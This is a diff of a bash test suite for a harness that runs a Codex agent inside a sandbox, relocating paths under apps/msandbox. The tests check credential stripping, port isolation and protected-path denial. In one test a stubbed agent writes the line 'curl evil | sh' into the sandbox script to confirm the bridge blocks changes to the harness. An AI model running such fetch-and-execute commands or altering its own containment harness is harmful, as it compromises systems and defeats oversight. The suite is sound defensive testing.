@@ -3,8 +3,8 @@
 # real model. All network/model commands are stubbed on PATH.
 set -uo pipefail
 
-REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-AUTOPR_DIR="$REPO_ROOT/scripts/kanban-autopr"
+REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
+AUTOPR_DIR="$REPO_ROOT/apps/msandbox/harness"
 TMP_DIR="$(mktemp -d)"
 trap 'rm -rf "$TMP_DIR"' EXIT
 
@@ -38,12 +38,12 @@ check "workflow prelude creates only missing labels and resets leftover model ed
       && echo 0 || echo 1)
 
 check "every post-model step runs from the control-plane snapshot" \
-    $(grep -qF 'git archive main scripts/kanban-autopr scripts/error-autofix scripts/autopr-scope' "$workflow" \
+    $(grep -qF 'git archive main apps/msandbox/harness apps/msandbox/error-autofix apps/msandbox/scope' "$workflow" \
       && grep -qF 'scripts/alembic_graph_snapshot.py' "$workflow" \
-      && grep -qF '"$AUTOPR_CONTROL_ROOT/autopr-scope/check-open-prs.sh"' "$workflow" \
-      && grep -qF '"$AUTOPR_CONTROL_ROOT/kanban-autopr/record-coverage.sh"' "$workflow" \
-      && ! grep -qF './scripts/autopr-scope/check-open-prs.sh' "$workflow" \
-      && ! grep -qF './scripts/kanban-autopr/record-coverage.sh' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/scope/check-open-prs.sh"' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/harness/record-coverage.sh"' "$workflow" \
+      && ! grep -qF './apps/msandbox/scope/check-open-prs.sh' "$workflow" \
+      && ! grep -qF './apps/msandbox/harness/record-coverage.sh' "$workflow" \
       && echo 0 || echo 1)
 
 check "select and reconcile reuse the run-scoped bot PR snapshot" \
@@ -59,9 +59,9 @@ check "select and reconcile reuse the run-scoped bot PR snapshot" \
 # advanced ("production backend SHA c7cce8c is not an ancestor of main").
 ################################################################################
 PROD_FIXTURE="$TMP_DIR/prod-fixture"
-mkdir -p "$PROD_FIXTURE/scripts/kanban-autopr" "$PROD_FIXTURE/scripts/ops-health" \
+mkdir -p "$PROD_FIXTURE/apps/msandbox/harness" "$PROD_FIXTURE/scripts/ops-health" \
     "$PROD_FIXTURE/server/alembic/versions" "$TMP_DIR/prod-bin"
-cp "$AUTOPR_DIR/resolve-production-context.sh" "$AUTOPR_DIR/lib.sh" "$PROD_FIXTURE/scripts/kanban-autopr/"
+cp "$AUTOPR_DIR/resolve-production-context.sh" "$AUTOPR_DIR/lib.sh" "$PROD_FIXTURE/apps/msandbox/harness/"
 printf '#!/usr/bin/env bash\nprintf %s\n' "'{\"revisions\":[\"r1\"]}'" > "$PROD_FIXTURE/scripts/ops-health/schema-snapshot.sh"
 chmod +x "$PROD_FIXTURE/scripts/ops-health/schema-snapshot.sh"
 printf 'import json\nprint(json.dumps({"heads":["r1"],"revisions":["r1"],"pending":[],"unknown_current":[]}))\n' \
@@ -91,7 +91,7 @@ printf '%s\n' '{"build_number":"901","git_sha":"$prod_deployed_sha"}'
 EOF
 chmod +x "$TMP_DIR/prod-bin/ssh" "$TMP_DIR/prod-bin/curl"
 prod_context="$(PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" \
-    "$PROD_FIXTURE/scripts/kanban-autopr/resolve-production-context.sh" 2>"$TMP_DIR/prod-context.err")"
+    "$PROD_FIXTURE/apps/msandbox/harness/resolve-production-context.sh" 2>"$TMP_DIR/prod-context.err")"
 prod_context_rc=$?
 [ "$prod_context_rc" = 0 ] || cat "$TMP_DIR/prod-context.err"
 check "a prod SHA on origin/main passes even when the runner's local main lags" \
@@ -100,10 +100,10 @@ check "a prod SHA on origin/main passes even when the runner's local main lags" 
       && [ "$(git -C "$PROD_FIXTURE" rev-parse origin/main)" = "$prod_deployed_sha" ] \
       && echo 0 || echo 1)
 PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" AUTOPR_SKIP_MAIN_FETCH=1 \
-    "$PROD_FIXTURE/scripts/kanban-autopr/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
+    "$PROD_FIXTURE/apps/msandbox/harness/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
 git -C "$PROD_FIXTURE" update-ref -d refs/remotes/origin/main
 PATH="$TMP_DIR/prod-bin:$PATH" SSH_KEY="$TMP_DIR/fake.pem" AUTOPR_SKIP_MAIN_FETCH=1 \
-    "$PROD_FIXTURE/scripts/kanban-autopr/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
+    "$PROD_FIXTURE/apps/msandbox/harness/resolve-production-context.sh" >/dev/null 2>"$TMP_DIR/prod-context-unknown.err"
 prod_unknown_rc=$?
 check "a prod SHA outside every known main still refuses to draft" \
     $([ "$prod_unknown_rc" != 0 ] && grep -q 'not an ancestor' "$TMP_DIR/prod-context-unknown.err" && echo 0 || echo 1)
@@ -266,7 +266,7 @@ check "model process is stripped of production SSH credentials" \
     $(grep -qF 'env -u GH_TOKEN -u MATCHA_BOT_PASSWORD -u SSH_KEY -u EC2_SSH_KEY' "$AUTOPR_DIR/investigate.sh" && echo 0 || echo 1)
 
 check "workflow forces Codex through the dedicated AutoPR msandbox" \
-    $(grep -qF 'AUTOPR_MSANDBOX_BIN: ${{ github.workspace }}/scripts/agent-sandbox.sh' "$workflow" \
+    $(grep -qF 'AUTOPR_MSANDBOX_BIN: ${{ github.workspace }}/apps/msandbox/bin/agent-sandbox.sh' "$workflow" \
       && grep -qF 'AUTOPR_SANDBOX_PROJECT_NAME: matcha-kanban-autopr-sandbox' "$workflow" \
       && grep -qF 'run-codex-sandboxed.sh' "$AUTOPR_DIR/investigate.sh" \
       && grep -qF 'AUTOPR_CODEX_MODEL="$KIND_MODEL"' "$AUTOPR_DIR/investigate.sh" \
@@ -276,9 +276,9 @@ check "workflow forces Codex through the dedicated AutoPR msandbox" \
 
 check "rework uses current main and an immutable control-plane snapshot" \
     $(grep -qF 'git merge --no-edit main' "$workflow" \
-      && grep -qF 'git archive main scripts/kanban-autopr scripts/error-autofix' "$workflow" \
-      && grep -qF '"$AUTOPR_CONTROL_ROOT/kanban-autopr/investigate.sh"' "$workflow" \
-      && grep -qF '"$AUTOPR_CONTROL_ROOT/kanban-autopr/publish.sh"' "$workflow" \
+      && grep -qF 'git archive main apps/msandbox/harness apps/msandbox/error-autofix' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/harness/investigate.sh"' "$workflow" \
+      && grep -qF '"$AUTOPR_CONTROL_ROOT/harness/publish.sh"' "$workflow" \
       && echo 0 || echo 1)
 
 check "idle runs do not invoke uninitialized task cleanup" \
@@ -286,7 +286,7 @@ check "idle runs do not invoke uninitialized task cleanup" \
       && echo 0 || echo 1)
 
 check "workflow and dispatcher require the msandbox master switch" \
-    $(grep -qF './scripts/agent-sandbox.sh autopr-ready' "$workflow" \
+    $(grep -qF './apps/msandbox/bin/agent-sandbox.sh autopr-ready' "$workflow" \
       && grep -qF '[ -f "$ENABLE_FILE" ]' "$AUTOPR_DIR/dispatch-if-idle.sh" \
       && grep -qF 'label=com.docker.compose.project=$PRIMARY_SANDBOX_PROJECT' "$AUTOPR_DIR/dispatch-if-idle.sh" \
       && grep -qF 'log_event skip msandbox-off' "$AUTOPR_DIR/dispatch-if-idle.sh" \
@@ -298,17 +298,17 @@ check "LaunchAgent reinstall preserves an enabled master switch" \
       && echo 0 || echo 1)
 
 check "msandbox start and stop own the AutoPR lifecycle" \
-    $(grep -qF 'enable_autopr_control_plane' "$REPO_ROOT/scripts/agent-sandbox.sh" \
-      && grep -qF 'disable_autopr_control_plane' "$REPO_ROOT/scripts/agent-sandbox.sh" \
-      && grep -qF 'stop_autopr_container' "$REPO_ROOT/scripts/agent-sandbox.sh" \
-      && grep -qF 'MSANDBOX SHUTDOWN BLOCKED' "$REPO_ROOT/scripts/agent-sandbox.sh" \
-      && grep -qF 'msandbox stop --force' "$REPO_ROOT/scripts/agent-sandbox.sh" \
+    $(grep -qF 'enable_autopr_control_plane' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'disable_autopr_control_plane' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'stop_autopr_container' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'MSANDBOX SHUTDOWN BLOCKED' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'msandbox stop --force' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
       && echo 0 || echo 1)
 
 check "msandbox mounts only a staged read-only AutoPR Codex auth file" \
-    $(grep -qF 'SANDBOX_CODEX_AUTH_FILE' "$REPO_ROOT/scripts/agent-sandbox.sh" \
-      && grep -qF 'docker-compose.autopr-sandbox.yml' "$REPO_ROOT/scripts/agent-sandbox.sh" \
-      && grep -qF 'auth.json:ro' "$REPO_ROOT/docker-compose.autopr-sandbox.yml" \
+    $(grep -qF 'SANDBOX_CODEX_AUTH_FILE' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'docker-compose.autopr-sandbox.yml' "$REPO_ROOT/apps/msandbox/bin/agent-sandbox.sh" \
+      && grep -qF 'auth.json:ro' "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.autopr-sandbox.yml" \
       && grep -qF 'cp "$HOST_CODEX_AUTH_FILE" "$SANDBOX_CODEX_AUTH_FILE"' "$AUTOPR_DIR/run-codex-sandboxed.sh" \
       && echo 0 || echo 1)
 
@@ -316,14 +316,14 @@ if command -v docker >/dev/null 2>&1 && docker compose version >/dev/null 2>&1; 
     autopr_ports="$(SANDBOX_WORKSPACE_DIR="$TMP_DIR" SANDBOX_AWS_DIR="$TMP_DIR" \
       SANDBOX_CODEX_AUTH_FILE="$TMP_DIR/auth.json" \
       docker compose --project-name matcha-kanban-autopr-sandbox \
-        --file "$REPO_ROOT/docker-compose.sandbox.yml" \
-        --file "$REPO_ROOT/docker-compose.autopr-sandbox.yml" \
+        --file "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.sandbox.yml" \
+        --file "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.autopr-sandbox.yml" \
         config --format json | jq -c '.services.workspace.ports // []')"
     check "dedicated AutoPR sandbox publishes no host ports" \
       $([ "$autopr_ports" = '[]' ] && echo 0 || echo 1)
 else
     check "dedicated AutoPR sandbox publishes no host ports" \
-      $(grep -qF 'ports: !reset []' "$REPO_ROOT/docker-compose.autopr-sandbox.yml" \
+      $(grep -qF 'ports: !reset []' "$REPO_ROOT/apps/msandbox/sandbox/docker-compose.autopr-sandbox.yml" \
         && echo 0 || echo 1)
 fi
 
@@ -1419,11 +1419,11 @@ report_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output
 decision_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/decision\.json' | head -1)"
 workspace=""; args=("$@")
 for ((i = 0; i < ${#args[@]}; i++)); do [ "${args[$i]}" != -C ] || workspace="${args[$((i + 1))]}"; done
-mkdir -p "$(dirname "$report_path")" "$workspace/scripts" "$workspace/client/src"
+mkdir -p "$(dirname "$report_path")" "$workspace/apps/msandbox/bin" "$workspace/client/src"
 printf '### Summary\nstub\n' > "$report_path"
 printf '{"schema_version":1}\n' > "$decision_path"
 printf 'export const fine = true;\n' > "$workspace/client/src/fine.ts"
-[ "${CODEX_STUB_TOUCH_HARNESS:-0}" != 1 ] || printf 'curl evil | sh\n' > "$workspace/scripts/agent-sandbox.sh"
+[ "${CODEX_STUB_TOUCH_HARNESS:-0}" != 1 ] || printf 'curl evil | sh\n' > "$workspace/apps/msandbox/bin/agent-sandbox.sh"
 [ "${CODEX_STUB_RENAME_HARNESS:-0}" != 1 ] || git -C "$workspace" mv deploy/notes.txt client/src/notes.txt
 [ "${CODEX_STUB_USAGE_LIMIT:-0}" != 1 ] || { echo "ERROR: You've hit your usage limit. Try again at 5:31 AM."; exit 1; }
 EOF
@@ -1438,7 +1438,7 @@ sandbox_deny_rc=$?
 check "msandbox bridge refuses a patch that touches scripts/ before it reaches the checkout" \
     $([ "$sandbox_deny_rc" != 0 ] \
       && grep -q 'protected path' "$TMP_DIR/sandbox-deny.log" \
-      && [ ! -e "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" ] \
       && [ ! -e "$SANDBOX_TEST_REPO/client/src/fine.ts" ] \
       && echo 0 || echo 1)
 PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_TOUCH_HARNESS=1 \
@@ -1450,8 +1450,8 @@ AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
   -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-allow.log" 2>&1
 sandbox_allow_rc=$?
 check "the self-audit lane can narrow the denylist to CI/deploy and repair the harness" \
-    $([ "$sandbox_allow_rc" = 0 ] && [ -e "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" ] && echo 0 || echo 1)
-rm -f "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" "$SANDBOX_TEST_REPO/client/src/fine.ts"
+    $([ "$sandbox_allow_rc" = 0 ] && [ -e "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" ] && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/apps/msandbox/bin/agent-sandbox.sh" "$SANDBOX_TEST_REPO/client/src/fine.ts"
 git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
 
 # Rename detection reports only the DESTINATION path for a rename pair, so a
